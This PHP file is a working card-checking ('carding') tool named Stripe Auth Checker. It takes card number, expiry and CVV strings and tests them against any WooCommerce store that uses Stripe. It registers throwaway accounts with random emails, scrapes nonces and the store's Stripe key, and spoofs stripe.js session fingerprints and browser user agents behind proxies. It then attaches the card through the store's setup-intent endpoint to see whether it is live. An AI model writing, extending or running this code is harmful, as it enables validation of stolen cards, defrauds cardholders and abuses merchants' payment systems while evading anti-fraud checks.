<?php
/**
 * Stripe Auth Checker
 * Automatically creates accounts and adds payment methods to Stripe-powered sites
 * Based on actual WooCommerce + Stripe flow
 */

require_once __DIR__ . '/bin_lookup.php';

class StripeAuthChecker {
    private $domain;
    private $proxy;
    private $userAgents;
    private $currentUserAgent;
    private $cookies = [];
    private $sessionStartTime;
    private $sessionPages = 0;
    private $accountCreated = false;
    private $accountEmail = null;
    private $registerNonce = null;
    private $paymentNonce = null;
    private $createSetupIntentNonce = null;
    private $createAndConfirmSetupIntentNonce = null;
    private $stripePublishableKey = null;
    private $stripeAccountId = null;
    private $pmId = null;
    private $guid = null;
    private $muid = null;
    private $sid = null;
    private $stripePattern = null;
    private $logBuffer = [];
    
    public function __construct($domain, $proxy = null) {
        $this->domain = rtrim($domain, '/');
        if (strpos($this->domain, 'http') !== 0) {
            $this->domain = 'https://' . $this->domain;
        }
        
        $this->userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        
        $this->setRandomUserAgent();
        
        if ($proxy) {
            $this->proxy = $this->formatProxy($proxy);
            $this->log("Using proxy: " . $this->proxy);
        }
        
        $this->sessionStartTime = date('Y-m-d H:i:s');
    }
    
    private function formatProxy($proxy) {
        $parts = explode(':', $proxy);
        if (count($parts) == 2) {
            // ip:port format
            return $proxy;
        } elseif (count($parts) == 4) {
            // ip:port:user:pass format -> convert to user:pass@ip:port
            return $parts[2] . ':' . $parts[3] . '@' . $parts[0] . ':' . $parts[1];
        }
        return $proxy;
    }
    
    private function setRandomUserAgent() {
        $this->currentUserAgent = $this->userAgents[array_rand($this->userAgents)];
        $this->log("Using User-Agent: " . substr($this->currentUserAgent, 0, 50) . "...");
    }
    
    private function log($message, $level = "INFO") {
        $timestamp = date('H:i:s');
        $entry = [
            'timestamp' => $timestamp,
            'level' => $level,
            'message' => $message
        ];
        $this->logBuffer[] = $entry;

        if (PHP_SAPI === 'cli') {
            echo "[$timestamp] [$level] $message\n";
        }
    }
    
    private function generateEmail() {
        $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com'];
        $username = '';
        for ($i = 0; $i < 10; $i++) {
            $username .= chr(rand(97, 122));
        }
        return $username . '@' . $domains[array_rand($domains)];
    }
    
    private function generatePassword() {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%';
        $password = '';
        for ($i = 0; $i < 12; $i++) {
            $password .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $password;
    }
    
    private function extractField($html, $pattern, $default = null) {
        if (preg_match($pattern, $html, $matches)) {
            return $matches[1];
        }
        return $default;
    }
    
    private function extractJsonVar($html, $varName) {
        // Find the start of the JSON object after the variable name
        $pattern = '/var\s+' . preg_quote($varName, '/') . '\s*=\s*(\{)/i';
        if (preg_match($pattern, $html, $match, PREG_OFFSET_CAPTURE)) {
            $startPos = $match[1][1]; // Position of the opening brace
            $braceCount = 0;
            $inString = false;
            $escapeNext = false;
            $jsonStr = '';
            $i = $startPos;
            
            while ($i < strlen($html)) {
                $char = $html[$i];
                
                if ($escapeNext) {
                    $jsonStr .= $char;
                    $escapeNext = false;
                    $i++;
                    continue;
                }
                
                if ($char == '\\') {
                    $jsonStr .= $char;
                    $escapeNext = true;
                    $i++;
                    continue;
                }
                
                if ($char == '"' && !$escapeNext) {
                    $inString = !$inString;
                    $jsonStr .= $char;
                } elseif (!$inString) {
                    if ($char == '{') {
                        $braceCount++;
                        $jsonStr .= $char;
                    } elseif ($char == '}') {
                        $braceCount--;
                        $jsonStr .= $char;
                        if ($braceCount == 0) {
                            break;
                        }
                    } else {
                        $jsonStr .= $char;
                    }
                } else {
                    $jsonStr .= $char;
                }
                
                $i++;
            }
            
            if ($braceCount == 0 && $jsonStr) {
                $decoded = json_decode($jsonStr, true);
                if ($decoded !== null) {
                    return $decoded;
                }
            }
        }
        
        return null;
    }
    
    private function makeRequest($url, $method = 'GET', $data = null, $headers = [], $returnInfo = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        
        // Set headers
        $defaultHeaders = [
            'User-Agent: ' . $this->currentUserAgent,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5'
        ];
        $allHeaders = array_merge($defaultHeaders, $headers);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $allHeaders);
        
        // Handle cookies
        if (!empty($this->cookies)) {
            $cookieStr = '';
            foreach ($this->cookies as $name => $value) {
                $cookieStr .= "$name=$value; ";
            }
            curl_setopt($ch, CURLOPT_COOKIE, trim($cookieStr));
        }
        
        // Capture response headers
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $header) {
            if (preg_match('/^Set-Cookie:\s*([^=]+)=([^;]+)/i', $header, $matches)) {
                $this->cookies[$matches[1]] = $matches[2];
            }
            return strlen($header);
        });
        
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data) {
                if (is_array($data)) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
                } else {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                }
            }
        }
        
        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $body = substr($response, $headerSize);
        
        curl_close($ch);
        
        if ($returnInfo) {
            return ['code' => $httpCode, 'body' => $body];
        }
        
        return $body;
    }
    
    public function step1VisitAccountPage() {
        $this->log(str_repeat("=", 60));
        $this->log("Step 1: Visiting account page");
        $this->log(str_repeat("=", 60));
        
        try {
            $url = rtrim($this->domain, '/') . '/my-account/';
            $this->log("GET $url");
            
            $result = $this->makeRequest($url, 'GET', null, [], true);
            $this->sessionPages++;
            
            if ($result['code'] != 200) {
                $this->log("Failed to load account page. Status: " . $result['code'], "ERROR");
                return [false, ""];
            }
            
            $this->log("Successfully loaded account page (Status: " . $result['code'] . ")");
            return [true, $result['body']];
        } catch (Exception $e) {
            $this->log("Error visiting account page: " . $e->getMessage(), "ERROR");
            return [false, ""];
        }
    }
    
    public function step3ExtractRegisterNonce($html) {
        $this->log(str_repeat("=", 60));
        $this->log("Step 3: Extracting registration nonce");
        $this->log(str_repeat("=", 60));
        
        $this->registerNonce = $this->extractField(
            $html,
            '/name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']/i'
        );
        
        if (!$this->registerNonce) {
            $this->log("Registration nonce not found!", "ERROR");
            return false;
        }
        
        $this->log("Extracted registration nonce: " . $this->registerNonce);
        return true;
    }
    
    public function step4CreateAccount() {
        $this->log(str_repeat("=", 60));
        $this->log("Step 4: Creating account");
        $this->log(str_repeat("=", 60));
        
        try {
            $this->accountEmail = $this->generateEmail();
            $password = $this->generatePassword();
            
            $this->log("Generated email: " . $this->accountEmail);
            
            $url = rtrim($this->domain, '/') . '/my-account/?action=register';
            
            $data = [
                'email' => $this->accountEmail,
                'password' => $password,
                'email_2' => '',
                'wc_order_attribution_source_type' => 'typein',
                'wc_order_attribution_referrer' => '(none)',
                'wc_order_attribution_utm_campaign' => '(none)',
                'wc_order_attribution_utm_source' => '(direct)',
                'wc_order_attribution_utm_medium' => '(none)',
                'wc_order_attribution_utm_content' => '(none)',
                'wc_order_attribution_utm_id' => '(none)',
                'wc_order_attribution_utm_term' => '(none)',
                'wc_order_attribution_utm_source_platform' => '(none)',
                'wc_order_attribution_utm_creative_format' => '(none)',
                'wc_order_attribution_utm_marketing_tactic' => '(none)',
                'wc_order_attribution_session_entry' => rtrim($this->domain, '/') . '/my-account/',
                'wc_order_attribution_session_start_time' => str_replace(' ', '+', $this->sessionStartTime),
                'wc_order_attribution_session_pages' => (string)$this->sessionPages,
                'wc_order_attribution_session_count' => '1',
                'wc_order_attribution_user_agent' => $this->currentUserAgent,
                'woocommerce-register-nonce' => $this->registerNonce,
                '_wp_http_referer' => '/my-account/',
                'register' => 'Register'
            ];
            
            $headers = [
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: ' . $this->domain,
                'Referer: ' . rtrim($this->domain, '/') . '/my-account/'
            ];
            
            $this->log("POST $url");
            
            $result = $this->makeRequest($url, 'POST', $data, $headers, true);
            $this->sessionPages++;
            
            if (in_array($result['code'], [200, 302, 303])) {
                if (in_array($result['code'], [302, 303])) {
                    $this->accountCreated = true;
                    $this->log("Account created successfully! (Redirect)");
                    return true;
                } elseif (stripos($result['body'], 'logged-in') !== false || stripos($result['body'], 'dashboard') !== false) {
                    $this->accountCreated = true;
                    $this->log("Account created successfully! (Logged in)");
                    return true;
                } else {
                    $this->accountCreated = true;
                    return true;
                }
            }
            
            $this->log("Registration failed. Status: " . $result['code'], "ERROR");
            return false;
        } catch (Exception $e) {
            $this->log("Error creating account: " . $e->getMessage(), "ERROR");
            return false;
        }
    }
    
    public function step5LoadPaymentMethodPage() {
        $this->log(str_repeat("=", 60));
        $this->log("Step 5: Loading payment method page");
        $this->log(str_repeat("=", 60));
        
        try {
            $url = rtrim($this->domain, '/') . '/my-account/add-payment-method/';
            $this->log("GET $url");
            
            $result = $this->makeRequest($url, 'GET', null, [], true);
            $this->sessionPages++;
            
            if ($result['code'] != 200) {
                $this->log("Failed to load payment method page. Status: " . $result['code'], "ERROR");
                return [false, ""];
            }
            
            $html = $result['body'];
            
            // Extract payment method nonce
            $this->paymentNonce = $this->extractField(
                $html,
                '/name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']/i'
            );
            
            // Detect pattern
            $wcpayConfig = $this->extractJsonVar($html, 'wcpay_upe_config');
            $wcStripeConfig = $this->extractJsonVar($html, 'wc_stripe_upe_params');
            
            if ($wcpayConfig) {
                $this->stripePattern = 'pattern1';
                $this->stripePublishableKey = $wcpayConfig['publishableKey'] ?? null;
                $this->stripeAccountId = $wcpayConfig['accountId'] ?? null;
                $this->createSetupIntentNonce = $wcpayConfig['createSetupIntentNonce'] ?? null;
                
                $this->log("Pattern 1 detected: wcpay_upe_config (WooCommerce Payments)");
                $this->log("Extracted Stripe publishable key: " . substr($this->stripePublishableKey ?? '', 0, 30) . "...");
            } elseif ($wcStripeConfig) {
                $this->stripePattern = 'pattern2';
                $this->stripePublishableKey = $wcStripeConfig['key'] ?? null;
                $this->createAndConfirmSetupIntentNonce = $wcStripeConfig['createAndConfirmSetupIntentNonce'] ?? null;
                
                $this->log("Pattern 2 detected: wc_stripe_upe_params (WooCommerce Stripe Gateway)");
                $this->log("Extracted Stripe publishable key: " . substr($this->stripePublishableKey ?? '', 0, 30) . "...");
            }
            
            // Fallback extraction
            if (!$this->stripePublishableKey) {
                $this->stripePublishableKey = $this->extractField($html, '/"publishableKey"\s*:\s*"([^"]+)"/i');
                if (!$this->stripePublishableKey) {
                    $this->stripePublishableKey = $this->extractField($html, '/"key"\s*:\s*"([^"]+)"/i');
                }
            }
            
            if (!$this->stripePublishableKey) {
                $this->log("Stripe publishable key not found!", "ERROR");
                return [false, $html];
            }
            
            return [true, $html];
        } catch (Exception $e) {
            $this->log("Error loading payment method page: " . $e->getMessage(), "ERROR");
            return [false, ""];
        }
    }
    
    public function step6GenerateStripeIds() {
        $this->log(str_repeat("=", 60));
        $this->log("Step 6: Generating Stripe session IDs");
        $this->log(str_repeat("=", 60));
        
        $this->guid = $this->generateUuid() . substr($this->generateUuid(), 0, 16);
        $this->muid = $this->generateUuid();
        $this->sid = $this->generateUuid();
        
        $this->log("Generated GUID: " . substr($this->guid, 0, 40) . "...");
        $this->log("Generated MUID: " . $this->muid);
        $this->log("Generated SID: " . $this->sid);
    }
    
    private function generateUuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }
    
    public function step7TokenizeCardStripe($cc, $mm, $yyyy, $cvv) {
        $this->log(str_repeat("=", 60));
        $this->log("Step 7: Tokenizing card with Stripe");
        $this->log(str_repeat("=", 60));
        
        try {
            if (!$this->stripePublishableKey) {
                $this->log("Stripe publishable key not found!", "ERROR");
                return false;
            }
            
            $stripeUrl = "https://api.stripe.com/v1/payment_methods";
            
            // Format card number (add spaces)
            $ccFormatted = implode(' ', str_split($cc, 4));
            
            // Format expiry year (2 digits)
            $yy = strlen($yyyy) == 4 ? substr($yyyy, -2) : $yyyy;
            
            // Generate time on page
            $timeOnPage = rand(100000, 300000);
            $clientSessionId = $this->generateUuid();
            
            $data = [
                'billing_details[name]' => ' ',
                'billing_details[email]' => $this->accountEmail,
                'billing_details[address][country]' => 'US',
                'billing_details[address][postal_code]' => '11019',
                'type' => 'card',
                'card[number]' => $ccFormatted,
                'card[cvc]' => $cvv,
                'card[exp_year]' => $yy,
                'card[exp_month]' => str_pad($mm, 2, '0', STR_PAD_LEFT),
                'allow_redisplay' => 'unspecified',
                'payment_user_agent' => 'stripe.js/0eddba596b; stripe-js-v3/0eddba596b; payment-element; deferred-intent',
                'referrer' => $this->domain,
                'time_on_page' => (string)$timeOnPage,
                'client_attribution_metadata[client_session_id]' => $clientSessionId,
                'client_attribution_metadata[merchant_integration_source]' => 'elements',
                'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
                'client_attribution_metadata[merchant_integration_version]' => '2021',
                'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]' => 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]' => $this->generateUuid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]' => 'payment',
                'guid' => $this->guid,
                'muid' => $this->muid,
                'sid' => $this->sid,
                'key' => $this->stripePublishableKey
            ];
            
            if ($this->stripeAccountId) {
                $data['_stripe_account'] = $this->stripeAccountId;
            }
            
            $headers = [
                'Accept: application/json',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://js.stripe.com',
                'Referer: https://js.stripe.com/',
                'User-Agent: ' . $this->currentUserAgent
            ];
            
            $this->log("POST $stripeUrl");
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $stripeUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode == 200) {
                $jsonResponse = json_decode($response, true);
                if (isset($jsonResponse['id'])) {
                    $this->pmId = $jsonResponse['id'];
                    $this->log("Card tokenized successfully! PM ID: " . $this->pmId);
                    return true;
                } else {
                    $error = $jsonResponse['error']['message'] ?? 'Unknown error';
                    $this->log("Stripe tokenization failed: $error", "ERROR");
                    return false;
                }
            } else {
                $jsonResponse = json_decode($response, true);
                $error = $jsonResponse['error']['message'] ?? 'Unknown error';
                $this->log("Stripe tokenization failed. Status: $httpCode, Error: $error", "ERROR");
                return false;
            }
        } catch (Exception $e) {
            $this->log("Error tokenizing card: " . $e->getMessage(), "ERROR");
            return false;
        }
    }
    
    public function step8CreateSetupIntent() {
        $this->log(str_repeat("=", 60));
        $this->log("Step 8: Creating setup intent");
        $this->log(str_repeat("=", 60));
        
        if ($this->stripePattern == 'pattern1') {
            return $this->step8CreateSetupIntentPattern1();
        } else {
            return $this->step8CreateSetupIntentPattern2();
        }
    }
    
    private function step8CreateSetupIntentPattern1() {
        $this->log("Trying Pattern 1: create_setup_intent (multipart/form-data)");
        
        if (!$this->createSetupIntentNonce) {
            $this->log("Pattern 1 nonce not found!", "ERROR");
            return [false, []];
        }
        
        $url = rtrim($this->domain, '/') . '/wp-admin/admin-ajax.php';
        $boundary = '----geckoformboundary' . bin2hex(random_bytes(16));
        
        $body = "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
        $body .= "create_setup_intent\r\n";
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"wcpay-payment-method\"\r\n\r\n";
        $body .= $this->pmId . "\r\n";
        $body .= "--$boundary\r\n";
        $body .= "Content-Disposition: form-data; name=\"_ajax_nonce\"\r\n\r\n";
        $body .= $this->createSetupIntentNonce . "\r\n";
        $body .= "--$boundary--\r\n";
        
        $headers = [
            'Content-Type: multipart/form-data; boundary=' . $boundary,
            'Origin: ' . $this->domain,
            'Referer: ' . rtrim($this->domain, '/') . '/my-account/add-payment-method/'
        ];
        
        $this->log("POST $url (Pattern 1)");
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        
        // Handle cookies
        if (!empty($this->cookies)) {
            $cookieStr = '';
            foreach ($this->cookies as $name => $value) {
                $cookieStr .= "$name=$value; ";
            }
            curl_setopt($ch, CURLOPT_COOKIE, trim($cookieStr));
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $this->parseSetupIntentResponse($response, $httpCode);
    }
    
    private function step8CreateSetupIntentPattern2() {
        $this->log("Trying Pattern 2: wc_stripe_create_and_confirm_setup_intent");
        
        if (!$this->createAndConfirmSetupIntentNonce) {
            $this->log("Pattern 2 nonce not found!", "ERROR");
            return [false, []];
        }
        
        $url = rtrim($this->domain, '/') . '/wp-admin/admin-ajax.php';
        
        $data = [
            'action' => 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method' => $this->pmId,
            'wc-stripe-payment-type' => 'card',
            '_ajax_nonce' => $this->createAndConfirmSetupIntentNonce
        ];
        
        $headers = [
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'Origin: ' . $this->domain,
            'Referer: ' . rtrim($this->domain, '/') . '/my-account/add-payment-method/'
        ];
        
        $this->log("POST $url (Pattern 2)");
        
        $result = $this->makeRequest($url, 'POST', $data, $headers, true);
        
        return $this->parseSetupIntentResponse($result['body'], $result['code']);
    }
    
    private function parseSetupIntentResponse($response, $httpCode) {
        $result = [
            'success' => false,
            'status' => 'UNKNOWN',
            'message' => '',
            'raw_response' => $response,
            'raw_response_json' => null,
            'status_code' => $httpCode
        ];
        
        if ($httpCode == 200) {
            $jsonResponse = json_decode($response, true);
            if ($jsonResponse !== null) {
                $result['raw_response_json'] = $jsonResponse;
                
                if (isset($jsonResponse['success']) && $jsonResponse['success']) {
                    $result['success'] = true;
                    $result['status'] = 'SUCCESS';
                    $result['message'] = 'Payment method added successfully';
                    $this->log("Card validation SUCCESS!");
                } else {
                    $result['success'] = false;
                    $result['status'] = 'ERROR';
                    
                    // Extract error message
                    $errorMsg = 'Card validation failed';
                    if (isset($jsonResponse['data']['error']['message'])) {
                        $errorMsg = $jsonResponse['data']['error']['message'];
                    } elseif (isset($jsonResponse['data']['message'])) {
                        $errorMsg = $jsonResponse['data']['message'];
                    } elseif (isset($jsonResponse['error']['message'])) {
                        $errorMsg = $jsonResponse['error']['message'];
                    } elseif (isset($jsonResponse['message'])) {
                        $errorMsg = $jsonResponse['message'];
                    }
                    
                    $result['message'] = $errorMsg;
                    $this->log("Card validation ERROR: $errorMsg", "ERROR");
                }
            }
        }
        
        return [$result['success'], $result];
    }
    
    public function run($cc, $mm, $yyyy, $cvv) {
        $this->log(str_repeat("=", 60));
        $this->log("Starting Stripe Auth Checker");
        $this->log(str_repeat("=", 60));
        
        // Step 1: Visit account page
        list($success, $html) = $this->step1VisitAccountPage();
        if (!$success) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => 'Failed to visit account page',
                'account_email' => null,
                'pm_id' => null
            ];
        }
        
        // Step 3: Extract registration nonce
        if (!$this->step3ExtractRegisterNonce($html)) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => 'Failed to extract registration nonce',
                'account_email' => null,
                'pm_id' => null
            ];
        }
        
        // Step 4: Create account
        if (!$this->step4CreateAccount()) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => 'Failed to create account',
                'account_email' => $this->accountEmail,
                'pm_id' => null
            ];
        }
        
        // Step 5: Load payment method page
        list($success, $html) = $this->step5LoadPaymentMethodPage();
        if (!$success) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => 'Failed to load payment method page',
                'account_email' => $this->accountEmail,
                'pm_id' => null
            ];
        }
        
        // Step 6: Generate Stripe session IDs
        $this->step6GenerateStripeIds();
        
        // Step 7: Tokenize card with Stripe
        if (!$this->step7TokenizeCardStripe($cc, $mm, $yyyy, $cvv)) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => 'Failed to tokenize card with Stripe',
                'account_email' => $this->accountEmail,
                'pm_id' => null
            ];
        }
        
        // Step 8: Create setup intent
        list($success, $result) = $this->step8CreateSetupIntent();
        
        $this->log(str_repeat("=", 60));
        $this->log("Process completed!");
        $this->log(str_repeat("=", 60));
        
        $result['account_email'] = $this->accountEmail;
        $result['success'] = $success;
        $result['pm_id'] = $this->pmId;
        $result['logs'] = $this->logBuffer;
        
        return $result;
    }

    public function getLogs(): array {
        return $this->logBuffer;
    }
}

// Helper functions
function parseCCString($ccString) {
    if (strpos($ccString, '|') !== false) {
        $parts = explode('|', $ccString);
        if (count($parts) == 4) {
            $cc = preg_replace('/[^0-9]/', '', $parts[0]);
            $mm = preg_replace('/[^0-9]/', '', $parts[1]);
            $year = preg_replace('/[^0-9]/', '', $parts[2]);
            $cvv = preg_replace('/[^0-9]/', '', $parts[3]);
            
            if (strlen($year) == 2) {
                $yyyy = (int)$year < 50 ? '20' . $year : '19' . $year;
            } else {
                $yyyy = $year;
            }
            
            return [$cc, $mm, $yyyy, $cvv];
        }
    }
    
    throw new Exception("Invalid CC format");
}

function validateLuhn($ccNumber) {
    $digits = preg_replace('/[^0-9]/', '', $ccNumber);
    if (strlen($digits) != 16) {
        return false;
    }
    
    $sum = 0;
    $reverse = strrev($digits);
    for ($i = 0; $i < strlen($reverse); $i++) {
        $digit = (int)$reverse[$i];
        if ($i % 2 == 1) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    
    return $sum % 10 == 0;
}

function validateExpiry($mm, $yyyy) {
    $month = (int)$mm;
    $year = (int)$yyyy;
    $currentYear = (int)date('Y');
    $currentMonth = (int)date('n');
    
    if ($year < $currentYear) {
        return [false, "Expired card"];
    } elseif ($year == $currentYear && $month < $currentMonth) {
        return [false, "Expired card"];
    }
    
    if ($year > $currentYear + 20) {
        return [false, "Invalid expiry date"];
    }
    
    return [true, null];
}

function auth($domain, $ccString, $proxy = null) {
    try {
        list($cc, $mm, $yyyy, $cvv) = parseCCString($ccString);
        
        if (!validateLuhn($cc)) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => 'Incorrect card number',
                'account_email' => null,
                'pm_id' => null,
                'logs' => []
            ];
        }
        
        list($isValid, $error) = validateExpiry($mm, $yyyy);
        if (!$isValid) {
            return [
                'success' => false,
                'status' => 'ERROR',
                'message' => $error,
                'account_email' => null,
                'pm_id' => null,
                'logs' => []
            ];
        }
        
        $checker = new StripeAuthChecker($domain, $proxy);
        $result = $checker->run($cc, $mm, $yyyy, $cvv);
        if (!isset($result['logs'])) {
            $result['logs'] = $checker->getLogs();
        }
        return $result;
    } catch (Exception $e) {
        return [
            'success' => false,
            'status' => 'ERROR',
            'message' => 'Exception: ' . $e->getMessage(),
            'account_email' => null,
            'pm_id' => null,
            'logs' => []
        ];
    }
}
